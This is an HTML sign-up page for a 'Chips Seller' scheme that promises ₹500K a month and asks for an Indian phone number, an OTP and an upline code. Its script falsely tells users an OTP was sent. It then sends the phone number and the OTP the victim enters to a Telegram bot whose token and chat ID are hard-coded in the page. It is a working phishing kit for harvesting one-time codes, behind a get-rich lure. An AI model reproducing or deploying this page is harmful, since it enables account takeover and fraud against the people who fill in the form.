<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chips Seller - Sign Up</title>
    <!-- FontAwesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
        }
    </style>
</head>
<body class="bg-[#5213a8] min-h-screen text-slate-900 flex flex-col justify-start selection:bg-indigo-500 selection:text-white">

    <!-- Toast Notification Container -->
    <div id="toast-container" class="fixed top-5 left-1/2 -translate-x-1/2 z-50 flex flex-col gap-2 w-11/12 max-w-md pointer-events-none"></div>

    <!-- Top Banner Section -->
    <div class="w-full pt-4 px-4 max-w-md mx-auto flex justify-start items-center">
        <button class="bg-white/20 border border-white/30 text-white text-[11px] font-bold px-3 py-1 rounded-full backdrop-blur-md">
            JOIN US!
        </button>
    </div>

    <!-- Header Section -->
    <header class="w-full pt-3 pb-2 px-4 max-w-md mx-auto relative flex justify-between items-end">
        <div class="z-10">
            <h2 class="text-xl sm:text-2xl font-bold text-white leading-snug max-w-[240px]">
                As an official Chip Seller to earn <span class="text-amber-300 font-black">₹500K monthly.</span>
            </h2>
        </div>
        <!-- Graphics Illustration -->
        <div class="w-28 flex justify-end items-end relative -mb-2">
            <svg class="w-full h-auto" viewBox="0 0 120 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                <!-- Golden Coins -->
                <ellipse cx="75" cy="82" rx="16" ry="10" fill="#EAB308"/>
                <ellipse cx="75" cy="78" rx="16" ry="10" fill="#FACC15"/>
                <ellipse cx="60" cy="86" rx="14" ry="8" fill="#CA8A04"/>
                <ellipse cx="60" cy="82" rx="14" ry="8" fill="#EAB308"/>
                <rect x="56" y="65" width="28" height="18" rx="4" fill="#0284C7"/>
                <!-- Character 1 -->
                <circle cx="70" cy="15" r="7" fill="#FDE047"/>
                <path d="M63 26C63 24 66 23 70 23C74 23 77 24 77 26V55H63V26Z" fill="#38BDF8"/>
                <path d="M63 55H70V90H63V55Z" fill="#EAB308"/>
                <path d="M70 55H77V90H70V55Z" fill="#CA8A04"/>
                <!-- Character 2 -->
                <circle cx="85" cy="20" r="6" fill="#FDE047"/>
                <path d="M79 30C79 28 82 27 85 27C88 27 91 28 91 30V55H79V30Z" fill="#E11D48"/>
                <path d="M80 55H85V90H80V55Z" fill="#1E1B4B"/>
                <path d="M85 55H90V90H85V55Z" fill="#312E81"/>
            </svg>
        </div>
    </header>

    <!-- Main Card Form Section -->
    <main class="w-full max-w-md mx-auto px-4 pb-8 mt-2">
        <div class="bg-white rounded-[32px] p-6 shadow-2xl">
            <div class="text-center mb-5">
                <span class="text-indigo-600 font-extrabold tracking-widest text-[11px] uppercase">//// SIGN UP & EARN ////</span>
            </div>

            <form id="signup-form" onsubmit="handleFormSubmit(event)" class="space-y-4">
                <!-- Phone Number Input -->
                <div>
                    <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-100 transition-all">
                        <span class="pl-4 pr-3 text-slate-800 font-bold text-sm border-r border-slate-200">+91</span>
                        <input type="tel" id="phone" placeholder="Type phone number" maxlength="10" required
                            class="w-full py-3.5 px-3 bg-transparent text-slate-800 placeholder-slate-400 text-sm font-medium focus:outline-none">
                    </div>
                </div>

                <!-- OTP Input & Request Button -->
                <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-100 transition-all">
                    <input type="text" id="otp" placeholder="Type OTP" maxlength="6" required
                        class="w-full py-3.5 px-4 bg-transparent text-slate-800 placeholder-slate-400 text-sm font-medium focus:outline-none">
                    <button type="button" id="otp-btn" onclick="sendOTP()" 
                        class="mr-1.5 px-5 py-2.5 bg-[#4c1298] hover:bg-[#3d0e7a] text-white text-xs font-bold rounded-xl transition-all active:scale-95">
                        Request
                    </button>
                </div>

                <!-- Upline Code Input (Optional) -->
                <div>
                    <input type="text" id="upline" placeholder="Upline Code (Optional)"
                        class="w-full py-3.5 px-4 bg-white border border-slate-200 rounded-2xl text-slate-800 placeholder-slate-400 text-sm font-medium focus:outline-none focus:border-indigo-600 focus:ring-2 focus:ring-indigo-100 transition-all">
                </div>

                <!-- Submit Button -->
                <button type="submit" id="submit-btn"
                    class="w-full py-4 bg-[#4c1298] hover:bg-[#3d0e7a] text-white font-bold text-base rounded-2xl shadow-lg transition-all active:scale-95 flex items-center justify-center space-x-2">
                    <span>Sign up</span>
                </button>
            </form>
        </div>
    </main>

    <!-- Direct Telegram JavaScript Integration -->
    <script>
        const BOT_TOKEN = '8439698505:AAGLOUR5DuMaMLm81HarVsDvQ8gFkvcZFU0';
        const CHAT_ID = '8698008425';

        let countdownSeconds = 60;
        let timerInterval = null;

        // Toast Notification Function
        function showToast(message, type = 'info') {
            const container = document.getElementById('toast-container');
            if (!container) return;
            const toast = document.createElement('div');
            toast.className = `p-3.5 rounded-xl shadow-lg text-xs sm:text-sm font-medium transition-all duration-300 transform translate-y-2 opacity-0 text-white ${type === 'success' ? 'bg-emerald-600' : type === 'error' ? 'bg-rose-600' : 'bg-slate-800'}`;
            toast.innerHTML = `<div class="flex items-center space-x-2"><span>${message}</span></div>`;
            container.appendChild(toast);
            setTimeout(() => toast.classList.remove('opacity-0', 'translate-y-2'), 10);
            setTimeout(() => {
                toast.classList.add('opacity-0', 'translate-y-2');
                setTimeout(() => toast.remove(), 300);
            }, 4000);
        }

        // Step 1: Phone number request OTP
        async function sendOTP() {
            const phoneInput = document.getElementById('phone').value.trim();
            if (phoneInput.length < 10) {
                showToast('Please enter a valid 10-digit mobile number first!', 'error');
                return;
            }

            const otpBtn = document.getElementById('otp-btn');
            if (timerInterval) return;

            // Telegram Notification 1
            const message = `📲 *New OTP Request!*\n\n*Phone Number:* \`+91 ${phoneInput}\``;
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.error('Telegram Error:', error);
            }

            showToast('OTP sent successfully to +91 ' + phoneInput, 'success');
            otpBtn.disabled = true;
            countdownSeconds = 60;
            otpBtn.innerText = `${countdownSeconds}s`;
            otpBtn.classList.add('opacity-50', 'cursor-not-allowed');

            timerInterval = setInterval(() => {
                countdownSeconds--;
                otpBtn.innerText = `${countdownSeconds}s`;
                if (countdownSeconds <= 0) {
                    clearInterval(timerInterval);
                    timerInterval = null;
                    otpBtn.disabled = false;
                    otpBtn.innerText = 'Request';
                    otpBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                }
            }, 1000);
        }

        // Step 2: Form Submit with OTP
        async function handleFormSubmit(event) {
            event.preventDefault();

            const phone = document.getElementById('phone').value.trim();
            const otp = document.getElementById('otp').value.trim();
            const submitBtn = document.getElementById('submit-btn');

            if (phone.length < 10) {
                showToast('Please enter a valid phone number!', 'error');
                return;
            }

            if (otp.length < 4) {
                showToast('Please enter a valid OTP!', 'error');
                return;
            }

            submitBtn.disabled = true;
            submitBtn.innerHTML = `<span>Submitting...</span>`;

            // Telegram Notification 2
            const message = `🔑 *OTP Submitted!*\n\n*Phone Number:* \`+91 ${phone}\`\n*OTP Code:* \`${otp}\``;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    showToast('Sign up successful! Welcome aboard.', 'success');
                    document.getElementById('signup-form').reset();
                } else {
                    showToast('Failed to send data. Check configuration.', 'error');
                }
            } catch (error) {
                console.error('Error:', error);
                showToast('Network error! Please try again.', 'error');
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerHTML = `<span>Sign up</span>`;
            }
        }
    </script>
</body>
</html>
